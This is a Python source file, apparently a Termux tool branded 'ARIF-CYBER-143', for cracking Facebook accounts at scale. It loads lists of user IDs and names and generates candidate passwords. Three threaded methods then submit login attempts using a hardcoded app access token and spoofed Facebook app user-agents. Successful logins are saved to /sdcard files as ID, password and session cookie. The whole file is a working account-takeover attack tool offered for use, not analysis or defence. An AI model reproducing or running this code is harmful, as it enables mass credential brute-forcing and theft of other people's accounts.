...
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWNER     \x1b[1;97m● \033[38;5;46mARIF-CYBER-143
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
#-----------------------[ FILE-CODE ]-----------------------#
def file():
    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/Arif.txt");line()
    ...
    Arif_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
    plist=[]
    fresh()
    try:
    ...
    with tred(max_workers=20) as Arif:
        fresh()
        tl = str(len(fo))
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mTOTAL IDS \x1b[1;97m● {tl}')
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{Arif_x}\x1b[38;5;46m')
        ...
        for user in fo:
            ...
            passlist = plist
            if Arif_x =='1':
                Arif.submit(api1,ids,names,passlist)
            if Arif_x =='2':
                Arif.submit(api2,ids,names,passlist)
            if Arif_x =='3':
                Arif.submit(api3,ids,names,passlist)
#-----------------------[ FILE-METHOD-CODE ]-----------------------#
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mArif\x1b[1;97m-\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/25.0.0.9119;FBBV/8212656;FBDM/{density=.,width=720,height=1280};FBLC/en_US;FBRV/8967101;FBCR/null;FBMF/Samsung ;FBBD/Samsung ;FBPN/com.facebook.lite;FBDV/Galaxy A53;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'Arif-FILE-OK.txt')
                    open('/sdcard/Arif/Arif-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    ...
                    open('/sdcard/Jarin-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mArif\x1b[1;97m-\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/51.0.0.9099;FBBV/3426246;FBDM/{density=.,width=720,height=1280};FBLC/en_US;FBRV/8857279;FBCR/null;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.adsmanager;FBDV/Edge 20 Lite;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mARIF\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Arif-FILE-OK.txt')
                    open('/sdcard/Arif/ARIF-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [ARIF-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
                    open('/sdcard/Jarin-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
...
def api3(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mArif\x1b[1;97m-M3\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/23.0.0.6612;FBBV/6766596;FBDM/{density=.,width=720,height=1280};FBLC/en_US;FBRV/5211946;FBCR/null;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.mlite;FBDV/12R;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'ARIF-FILE-OK.txt')
                    open('/sdcard/Arif/Arif-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
...
def aproval():
    ...
    try:
        ...
        if id in url_apv:
            ...
            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUER KEY : ARIF{id}Cyber')
            line()
